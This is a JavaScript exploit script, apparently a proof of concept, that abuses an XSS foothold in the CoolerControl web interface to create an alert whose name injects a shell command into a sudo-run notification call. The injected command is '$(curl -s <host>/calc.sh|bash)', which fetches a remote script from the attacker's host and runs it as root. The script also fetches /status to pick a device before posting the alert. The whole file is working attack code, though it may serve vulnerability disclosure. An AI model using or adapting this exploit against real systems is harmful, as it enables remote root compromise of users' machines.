// Hack to get the original URL where the XSS originated from
function getUrl() {
    var path = null;
    var scriptTags = document.getElementsByTagName("script");

    for (var i = 0; i < scriptTags.length; i++) {
        var scriptTagSrc = scriptTags.item(i).src;

        if (scriptTagSrc && scriptTagSrc.indexOf("rce.js") !== -1) {
            path = new URL(scriptTagSrc);
            break;
        }
    }
    return path;
}
let url = getUrl();
// Define a further payload file, hosted on the same malicious.website
let payload_url = url.protocol + '//' + url.hostname + '/calc.sh'
// Ultimately define the command here to be ran as root
// Injected as alert.name unescaped into a shell command ran with sudo here:
// Self::fire_command(&format!("sudo -u \\#{} {} notify \"Alert Triggered: {}!\" \"{}\" 1 {}",uid, self.bin_path, alert.name, message, alert.desktop_notify_audio
// https://gitlab.com/coolercontrol/coolercontrol/-/blob/560a0e068d1a4c746c28e2f24fadf4603f905e49/coolercontrold/src/alerts.rs#L577
// MAX 50 CHARACTERS!
let rce_payload = '$(curl -s ' + payload_url + '|bash)';
// letsgooooooo
async function pwn_root(rce_payload) {
    try {
        console.log('Fetching status page...');
        const response = await fetch('/status');
        if (response.status !== 200) {
            throw new Error(`Network response was not ok: ${response.statusText}`);
        }
        // Parse the JSON data
        const jsonData = await response.json();
        console.log('Got device status.');
        // Recursive function to find the first valid 'temp', its name, and parent uid
        function findFirstValidTempWithUidAndName(data, parentUid = null, path = '') {
            if (Array.isArray(data)) {
                for (let i = 0; i < data.length; i++) {
                    const result = findFirstValidTempWithUidAndName(data[i], parentUid, `${path}[${i}]`);
                    if (result) {
                        return result;
                    }
                }
            } else if (typeof data === 'object' && data !== null) {
                // Check if this object has a uid
                if (data.uid) {
                    parentUid = data.uid;
                }
                for (const key in data) {
                    if (key === 'temps' && Array.isArray(data[key]) && data[key].length > 0) {
                        // Loop through the temps array to find a valid temp (over 1 celcius at least)
                        for (const temp of data[key]) {
                            if (temp.name && temp.temp > 1) {
                                return {
                                    uid: parentUid,
                                    name: temp.name,
                                    path: `${path}.temps[${data[key].indexOf(temp)}]`
                                };
                            }
                        }
                    }
                    const result = findFirstValidTempWithUidAndName(data[key], parentUid, path ? `${path}.${key}` : key);
                    if (result) {
                        return result;
                    }
                }
            }
            return null;
        }
        console.log('Parsing JSON to find a valid device for alert...');
        const valid_device = findFirstValidTempWithUidAndName(jsonData);
        if (valid_device) {
            console.log(`Found valid device from ${valid_device.path}`)
            console.log(`The uid is: ${valid_device.uid}`);
            console.log(`The name is: ${valid_device.name}`);
            // create a malicious alert in CoolerControl that results in the payload being ran with root perms on the target system
            console.log('Creating malicious alert...');
            const alert_response = await fetch('/alerts', {
                method: 'POST',
                credentials: "include",
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    'uid': 'fvzcyrvaqvpngbebspbzcebzvfr',
                    'name': rce_payload,
                    'channel_source': {
                        'device_uid': valid_device.uid,
                        'channel_name': valid_device.name,
                        'channel_metric': 'Temp'
                    },
                    'min': 0,
                    'max': 1,
                    'warmup_duration': 0,
                    'desktop_notify': true,
                    'desktop_notify_recovery': true,
                    'desktop_notify_audio': false,
                    'shutdown_on_activation': false
                })
            });
            if (alert_response.status !== 200) {
                throw new Error(`Creating alert resulted in error: ${response.statusText}`);
            }
        } else {
            throw new Error(`Cannot create alert. No devices found with valid temperatures: ${JSON.stringify(jsonData)}`);
        }
    } catch (error) {
        console.error(error);
    }
}
console.log('Starting RCE exploit with root perms...');
pwn_root(rce_payload);
